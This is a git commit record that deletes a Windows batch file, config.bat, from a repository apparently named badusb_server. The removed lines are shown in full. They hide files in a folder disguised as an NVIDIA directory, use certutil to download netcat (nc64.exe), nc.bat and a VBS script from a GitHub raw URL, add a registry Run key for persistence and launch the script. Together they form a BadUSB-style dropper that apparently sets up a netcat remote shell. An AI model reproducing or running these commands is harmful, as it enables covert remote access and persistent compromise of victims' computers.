a869befe3561758bc3d8f85515a91ef81ae57a7c
KBT096 <45223710+KBT096@users.noreply.github.com>
2019-08-25 16:59:42 +0800

    Delete config.bat

--- config.bat
+++
@@ -1,7 +0,0 @@
-cd "c:\ProgramData\NVIDIA DATE"
-certutil -urlcache -split -f https://raw.githubusercontent.com/KBT096/badusb_server/master/nc64.exe
-certutil -urlcache -split -f https://raw.githubusercontent.com/KBT096/badusb_server/master/nc.bat
-certutil -urlcache -split -f https://raw.githubusercontent.com/KBT096/badusb_server/master/shut.vbs
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "shut"  /t REG_SZ /d "c:\ProgramData\NVIDIA DATE\shut.vbs" /f
-"c:\ProgramData\NVIDIA DATE\shut.vbs"
- exit
